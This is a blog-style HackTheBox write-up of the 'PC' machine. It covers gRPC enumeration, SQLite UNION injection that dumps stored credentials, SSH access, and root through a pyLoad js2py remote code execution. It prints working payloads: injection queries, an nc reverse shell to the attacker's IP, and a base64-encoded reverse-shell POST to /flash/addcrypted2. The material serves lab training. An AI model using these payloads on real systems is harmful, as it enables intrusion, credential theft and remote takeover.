@@ -1,0 +1,189 @@
+---
+layout: post
+title:  "Writeup of PC (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox pc grpc pyLoad
+---
+
+# Enumeration
+
+`grpcurl -plaintext 10.10.11.214:50051 describe`
+
+```
+SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+grpc.reflection.v1alpha.ServerReflection is a service:
+service ServerReflection {
+  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
+}
+```
+
+# Looking for trouble
+
+`grpcurl -d '{"username":"user","password":"test1"}' -plaintext 10.10.11.214:50051 SimpleApp/RegisterUser`
+
+```json
+Response contents:
+{
+  "message": "Account created for user user!"
+}
+
+Response trailers received:
+(empty)
+```
+
+`grpcurl -d '{"username":"user","password":"test1"}' -vv -plaintext 10.10.11.214:50051 SimpleApp/LoginUser`
+
+```json
+Response contents:
+{
+  "message": "Your id is 128."
+}
+
+Response trailers received:
+token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlciIsImV4cCI6MTY4NjA5MDg1NH0.WZ1FKemOtkPPnYP0eXjNPzK4cCIJYk2Y1Z_3lq8a7y8'
+```
+
+**admin:admin** also works (gives a random ID).
+**JWT token!**
+
+`grpcurl -emit-defaults -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidXNlciIsImV4cCI6MTY4NjA5MDg1NH0.WZ1FKemOtkPPnYP0eXjNPzK4cCIJYk2Y1Z_3lq8a7y8' -d '{"id":"142"}' -plaintext 10.10.11.214:50051 SimpleApp/getInfo`
+
+```json
+Response contents:
+{
+  "message": "Will update soon."
+}
+
+Response trailers received:
+(empty)
+```
+
+`grpcurl -emit-defaults -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODYwOTQwMjl9.Z8ucE3bg0DfS7hTyw0ghWNf2s7IfA-hb4kxpy7QxtkE' -d '{"id":"464;sd"}' -vv -plaintext 10.10.11.214:50051 SimpleApp/getInfo`
+
+```
+ERROR:
+  Code: Unknown
+  Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
+```
+
+# SQLite3 injection!
+
+`injection.sh:`
+```
+x=$(cat injection.txt); grpcurl -emit-defaults -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODYwOTQwMjl9.Z8ucE3bg0DfS7hTyw0ghWNf2s7IfA-hb4kxpy7QxtkE' -d '{"id":"'"$x"'"}' -vv -plaintext 10.10.11.214:50051 SimpleApp/getInfo
+```
+
+### When injection.txt is...
+
+`1 UNION select sqlite_version();`
+
+```
+Response contents:
+{
+  "message": "3.31.1"
+}
+```
+
+### We can enumerate tables using:
+`5 UNION select tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' LIMIT 1 OFFSET 1;`
+
+```
+accounts, messages
+```
+
+### ...and rows using:
+`5 UNION select name FROM PRAGMA_TABLE_INFO('accounts') LIMIT 1 OFFSET 0;`
+
+```
+username, password
+```
+
+`5 UNION select name FROM PRAGMA_TABLE_INFO('messages') LIMIT 1 OFFSET 0;`
+
+```
+id, message, username
+```
+
+# Getting creds
+
+`5 UNION select username FROM accounts LIMIT 1 OFFSET 0;`
+
+```
+admin:admin
+sau:HereIsYourPassWord1431
+```
+
+# Getting messages
+
+`5 UNION select message FROM messages LIMIT 1 OFFSET 0;`
+
+```
+The admin is working hard to fix the issues.
+Will update soon.
+```
+
+# SSH user
+
+**sau:HereIsYourPassWord1431** works for SSH!
+
+`user.txt: <redacted>`
+
+# Enumeration
+```
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::50051                :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+```
+
+`ssh sau@10.10.11.214 -L 8000:localhost:8000 -L 9666:localhost:9666`
+
+**pyLoad** running on ports 8000 and 9666.
+
+# pyLoad?
+
+default creds **pyload:pyload** don't work
+
+`sau@pc:/etc/systemd/system$ cat pyload.service `
+
+```
+[Unit]
+Description=pyload service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/local/bin/pyload
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+# Root
+
+This reverse shell works (on sau):
+
+`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.144 9001 >/tmp/f`
+
+[There is a known RCE.](https://packetstormsecurity.com/files/171096/pyLoad-js2py-Python-Execution.html)
+
+**POST to :8000/flash/addcrypted2**
+
+```
+crypted=&jk=pyimport os;pyimport sys;pyimport base64;_=base64.b64decode("cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgMTAuMTAuMTQuMTQ0IDkwMDEgPi90bXAvZg%3d%3d");os.popen(sys.version_info[0] < 3?_:_.decode('utf-8'));f=function f2(){};
+```
+
+`root.txt: <redacted>`
